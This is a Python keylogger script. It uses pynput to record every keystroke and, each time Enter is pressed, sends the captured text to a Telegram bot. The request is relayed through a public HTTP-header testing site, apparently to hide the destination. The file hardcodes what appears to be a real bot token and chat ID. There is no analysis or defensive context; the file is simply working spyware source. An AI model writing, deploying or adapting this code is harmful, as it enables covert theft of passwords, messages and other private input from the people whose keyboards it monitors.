from pynput import keyboard
import requests



while True:






    HttpDebug = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx"
    TokenBot = "1760851666:AAE7erVKdFpAOl53MUsQgAl9gHIF4bjOCqU"
    ChatId ="91067933"
    list = []





    def convert(list):
        send = ''.join(map(str,list))
        sens2 =send.replace("'","")
        return(sens2.replace('"',''))





    def on_press(key):
        pass


    def on_release(key):
        if key == keyboard.Key.enter:
            a = convert(list)
            url = ("https://api.telegram.org/bot{a}/SendMessage?chat_id={b}&text={c}".format(a=TokenBot,b=ChatId,c=a))
            Payloads = {
                "UrlBox": url,
                "AgentList": "MOzilla Firefox",
                "VersionsList": "HTTP/1.1",
                "MethodList": "POST"
            }

            resp = requests.post(HttpDebug, Payloads).text
            list.clear()
            
        else:
            list.append(key)
        
    
 


    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    listener()



